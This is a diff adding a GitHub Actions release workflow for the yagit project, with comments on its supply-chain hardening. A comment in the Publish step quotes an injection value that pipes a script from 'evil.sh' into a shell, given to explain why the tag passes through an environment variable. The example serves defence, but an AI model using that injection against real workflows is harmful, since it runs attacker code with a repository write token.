@@ -1,0 +1,186 @@
+name: Release
+
+# Actions are pinned by digest — see the note at the top of ci.yml. It matters
+# most here: this is the workflow that holds `contents: write`.
+
+# Releases happen by merging to main. Nobody tags anything by hand.
+#
+# `./do version` reads the Conventional Commits since the last release tag and
+# says what the next version is, or says nothing when no commit asks for one —
+# a branch of docs, tests and CI work produces no release, which is right,
+# because a release nobody can tell apart from the last one is noise.
+#
+# Two jobs rather than one. Deciding is cheap and runs on every merge; building
+# six binaries, signing them and generating a bill of materials is not, and
+# runs only when there is something to publish.
+on:
+  push:
+    branches: [main]
+
+  # Cutting a release the decision rule declined to cut is a legitimate thing
+  # to want — the first one, or a rebuild after a botched upload. It still goes
+  # through the same rule, so it can only ever produce the version that rule
+  # would have produced.
+  workflow_dispatch:
+
+permissions:
+  contents: read # Read-only by default; the jobs below widen their own.
+
+# A release must never overlap another. cancel-in-progress stays false on
+# purpose: a half-published release is worse than a queued one.
+concurrency:
+  group: release-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  decide:
+    name: Decide
+    runs-on: ubuntu-latest
+    outputs:
+      # Empty when nothing warrants a release, which is how `publish` below
+      # knows to stay out of it.
+      version: ${{ steps.decide.outputs.version }}
+
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          # The whole history and every tag: the decision is "what has happened
+          # since the last release", and a shallow clone knows neither half.
+          fetch-depth: 0
+          persist-credentials: false
+
+      # Only the mise binary. The ./do shim installs the tools into
+      # .yagit/mise, so anything installed here would be downloaded twice and
+      # read never — and this workflow caches nothing on purpose, for the
+      # reason spelled out in the publish job below.
+      - uses: jdx/mise-action@c2a87611a18de5b3828c5652fe268e992400cb5c # v4.3.0
+        with:
+          install: false
+          cache: false
+
+      - id: decide
+        run: |
+          version="$(./do version)"
+
+          # Checked, not trusted. Whatever lands on stdout here becomes a git
+          # tag, and a tag in this repository is public and immutable by
+          # ruleset. `./do` runs mise and a Go build before the command itself,
+          # and any of the three could learn to print something one day —
+          # turning a stray warning into a release named after it.
+          if [ -n "$version" ] && ! printf '%s' "$version" | grep -qE '^v[0-9]+\.[0-9]+\.[0-9]+$'; then
+            echo "::error::./do version printed something that is not a version: $version"
+            exit 1
+          fi
+
+          echo "version=$version" >> "$GITHUB_OUTPUT"
+
+  publish:
+    name: Build and publish
+    needs: decide
+    if: needs.decide.outputs.version != ''
+    runs-on: ubuntu-latest
+    permissions:
+      # Needed to create the release and attach the binaries. Scoped to this job
+      # so the rest of the workflow stays read-only.
+      contents: write # create the tag and the release, upload the binaries
+      id-token: write # obtain the short-lived signing certificate for the attestations
+      attestations: write # record them against this repository
+
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          # `./do build` stamps the binary through `git describe`; without the
+          # tags it would silently produce "dev" and ship a mislabelled release.
+          fetch-depth: 0
+
+          # checkout otherwise leaves the job's token in .git/config, where
+          # every later step can read it — and this job's token can write to
+          # the repository. Nothing here pushes, so nothing here needs it.
+          persist-credentials: false
+
+      - uses: jdx/mise-action@c2a87611a18de5b3828c5652fe268e992400cb5c # v4.3.0
+        with:
+          # No cache on the release path. A cache is writable by any workflow
+          # run on any branch, so a poisoned entry restored here would end up
+          # inside a published binary. Downloading the toolchain again costs a
+          # minute, once per release.
+          cache: false
+
+          # And only the mise binary: the ./do shim installs the tools from
+          # mise.lock into .yagit/mise, which is where every command below
+          # reads them from.
+          install: false
+
+      # A release must never ship code that does not pass the gates. Running
+      # them here rather than trusting the CI run on the same commit keeps the
+      # two from drifting apart.
+      - run: ./do lint
+      - run: ./do test
+
+      # Tagged locally before the build, and only locally: `./do build` stamps
+      # the binary with `git describe`, so without the tag in place first every
+      # binary in the release would carry the version before it. The tag
+      # reaches the remote below, as part of creating the release, so a build
+      # that fails leaves no tag behind pointing at something unpublished.
+      - name: Stamp the version
+        env:
+          VERSION: ${{ needs.decide.outputs.version }}
+        run: git tag "$VERSION"
+
+      - run: ./do build
+
+      - name: Checksums
+        working-directory: dist
+        run: sha256sum yagit-* > SHA256SUMS
+
+      # What was built, from what, by which workflow run — signed by Sigstore
+      # with a certificate that exists for the length of this job and cannot be
+      # reissued afterwards.
+      #
+      # A checksum file says the bytes did not change in transit. It says
+      # nothing about where they came from, and it is published by whoever
+      # published the binaries: an attacker who can replace one can replace the
+      # other. The attestation is the half a checksum cannot be, and anyone can
+      # check it without trusting this repository:
+      #
+      #   gh attestation verify yagit-linux-amd64 --repo ngsanogo/yagit
+      - name: Attest the binaries
+        uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2
+        with:
+          subject-path: dist/yagit-*
+
+      # The Go side is one direct dependency deep — fsnotify, and the
+      # golang.org/x/sys it brings with it — so a naive reading says an SBOM
+      # here is two lines. It is not: `./do build` embeds the built frontend
+      # into every binary, and that frontend is compiled out of several hundred
+      # npm packages. They ship inside the executable and belong in the
+      # inventory of what someone is running.
+      - name: Bill of materials
+        uses: anchore/sbom-action@3ad7283483fc7af8ff2b4ea19663c2d5ca935e26 # v0.24.2
+        with:
+          path: .
+          format: spdx-json
+          artifact-name: yagit.spdx.json
+          output-file: dist/yagit.spdx.json
+
+      - name: Publish
+        env:
+          GH_TOKEN: ${{ github.token }}
+
+          # The version reaches the script as an environment variable, never as
+          # `${{ }}` inside the run block. Interpolation happens before the
+          # shell sees the line, so a value like `v1.0"; curl evil.sh | sh; "`
+          # would be pasted in as code and run with this job's write token.
+          # A variable is data whatever it contains — and this one is computed,
+          # which is exactly the kind of value that gets trusted by accident.
+          TAG: ${{ needs.decide.outputs.version }}
+        run: |
+          # --target pins the release to the commit that was built, rather than
+          # to whatever main points at by the time this line runs. It also
+          # creates the tag on the remote, so the local one above never has to
+          # be pushed with a credential this job does not keep.
+          gh release create "$TAG" \
+            --title "$TAG" \
+            --target "$GITHUB_SHA" \
+            --generate-notes \
+            dist/yagit-* dist/SHA256SUMS dist/yagit.spdx.json
